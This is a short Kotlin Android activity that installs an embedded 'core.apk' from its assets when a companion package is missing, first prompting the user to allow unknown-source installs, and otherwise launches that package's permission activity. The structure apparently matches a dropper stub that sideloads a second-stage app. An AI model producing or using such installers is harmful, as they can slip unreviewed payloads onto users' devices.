package com.t.shell
import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.core.content.FileProvider
import java.io.File

class MainActivity : Activity() {
    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        try {
            packageManager.getPackageInfo("com.t.core", 0)
            startActivity(Intent().setClassName("com.t.core", "com.t.core.PermActivity").addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            finish()
        } catch (e: Exception) {
            val f = File(cacheDir, "u.apk")
            assets.open("core.apk").use { i -> f.outputStream().use { o -> i.copyTo(o) } }
            val i = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(FileProvider.getUriForFile(this@MainActivity, "com.t.shell.fp", f), "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            if (Build.VERSION.SDK_INT >= 26 && !packageManager.canRequestPackageInstalls()) {
                startActivity(Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:$packageName")))
            } else startActivity(i)
        }
    }
}
